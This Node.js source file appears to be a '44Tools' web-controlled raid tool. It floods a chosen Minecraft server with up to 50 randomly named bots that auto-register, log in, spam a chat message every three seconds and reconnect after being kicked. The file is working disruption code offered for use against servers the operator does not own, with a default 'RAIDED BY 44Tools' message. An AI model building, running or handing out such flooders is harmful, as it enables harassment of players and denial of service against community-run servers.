'use strict';

const express   = require('express');
const http      = require('http');
const WebSocket = require('ws');
const path      = require('path');
const mineflayer = require('mineflayer');

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// ── static files ─────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── state ─────────────────────────────────────
let activeBots   = [];   // { bot, username, interval }
let isRunning    = false;
let clients      = new Set();

// ── websocket broadcast ───────────────────────
function broadcast(type, msg) {
  const data = JSON.stringify({ type, msg, time: new Date().toLocaleTimeString() });
  clients.forEach(c => {
    if (c.readyState === WebSocket.OPEN) c.send(data);
  });
}

wss.on('connection', ws => {
  clients.add(ws);
  ws.send(JSON.stringify({ type: 'info', msg: 'Connected to 44Tools server.', time: new Date().toLocaleTimeString() }));
  ws.send(JSON.stringify({ type: 'status', running: isRunning, botCount: activeBots.length }));
  ws.on('close', () => clients.delete(ws));
});

// ── routes ────────────────────────────────────
app.post('/start', (req, res) => {
  if (isRunning) return res.json({ ok: false, error: 'Already running.' });

  const { host, port, bots, message, proxies } = req.body;

  if (!host)        return res.json({ ok: false, error: 'Server IP required.' });
  if (!port)        return res.json({ ok: false, error: 'Port required.' });
  if (!bots || bots < 1) return res.json({ ok: false, error: 'Bot count must be at least 1.' });

  const botCount  = Math.min(parseInt(bots) || 1, 50);
  const spamMsg   = message || 'RAIDED BY 44Tools';
  const proxyList = proxies ? proxies.split('\n').map(l => l.trim()).filter(Boolean) : [];

  isRunning = true;
  broadcast('info', `Starting flood → ${host}:${port} | ${botCount} bots`);
  broadcastStatus();

  for (let i = 0; i < botCount; i++) {
    setTimeout(() => {
      if (!isRunning) return;
      spawnBot(host, parseInt(port), spamMsg, proxyList);
    }, i * 5000);
  }

  res.json({ ok: true });
});

app.post('/stop', (req, res) => {
  stopAll();
  res.json({ ok: true });
});

app.get('/status', (req, res) => {
  res.json({ running: isRunning, botCount: activeBots.length });
});

// ── bot logic ─────────────────────────────────
function randomName() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let name = '44T_';
  for (let i = 0; i < 8; i++) name += chars[Math.floor(Math.random() * chars.length)];
  return name.substring(0, 16);
}

function spawnBot(host, port, spamMsg, proxyList) {
  if (!isRunning) return;
  const username = randomName();

  const opts = {
    host,
    port,
    username,
    version: '1.20.1',
    hideErrors: true,
    checkTimeoutInterval: 30000
  };

  let bot;
  try { bot = mineflayer.createBot(opts); }
  catch (e) {
    broadcast('error', `[ERR] Failed to create bot: ${e.message}`);
    return;
  }

  let spamInterval = null;
  const entry = { bot, username, interval: null };
  activeBots.push(entry);
  broadcastStatus();

  bot.once('spawn', () => {
    broadcast('join', `[+] ${username} spawned`);

    setTimeout(() => {
      const pass = Math.random().toString(36).slice(2, 12);
      try { bot.chat(`/register ${pass} ${pass}`); } catch {}
      try { bot.chat(`/login ${pass}`); } catch {}

      setTimeout(() => {
        if (!isRunning) return;
        spamInterval = setInterval(() => {
          if (!isRunning) { clearInterval(spamInterval); return; }
          if (bot.entity) {
            try { bot.chat(spamMsg); } catch {}
          } else {
            clearInterval(spamInterval);
          }
        }, 3000);
        entry.interval = spamInterval;
      }, 3000);
    }, 2000);
  });

  bot.on('kicked', reason => {
    let msg = '';
    if (reason && typeof reason === 'object') {
      msg = reason.text || reason.translate || JSON.stringify(reason);
    } else { msg = reason || 'Unknown'; }
    broadcast('kick', `[!] ${username} kicked: ${msg}`);
    if (spamInterval) clearInterval(spamInterval);
    removeBotEntry(entry);
  });

  bot.on('end', () => {
    broadcast('leave', `[-] ${username} disconnected`);
    if (spamInterval) clearInterval(spamInterval);
    removeBotEntry(entry);
    if (isRunning) {
      setTimeout(() => spawnBot(host, port, spamMsg, proxyList), 10000);
    }
  });

  bot.on('error', err => {
    if (err.code === 'ECONNREFUSED') {
      broadcast('error', `[X] Connection refused — check IP/Port`);
      stopAll();
    } else {
      broadcast('error', `[X] ${username}: ${err.message}`);
    }
    removeBotEntry(entry);
  });
}

function removeBotEntry(entry) {
  const idx = activeBots.indexOf(entry);
  if (idx > -1) activeBots.splice(idx, 1);
  broadcastStatus();
}

function stopAll() {
  isRunning = false;
  activeBots.forEach(e => {
    if (e.interval) clearInterval(e.interval);
    try { e.bot.quit(); } catch {}
  });
  activeBots = [];
  broadcast('info', 'Flood stopped. All bots disconnected.');
  broadcastStatus();
}

function broadcastStatus() {
  const data = JSON.stringify({ type: 'status', running: isRunning, botCount: activeBots.length });
  clients.forEach(c => { if (c.readyState === WebSocket.OPEN) c.send(data); });
}

// ── start ─────────────────────────────────────
server.listen(PORT, () => {
  console.log(`44Tools server running on port ${PORT}`);
});
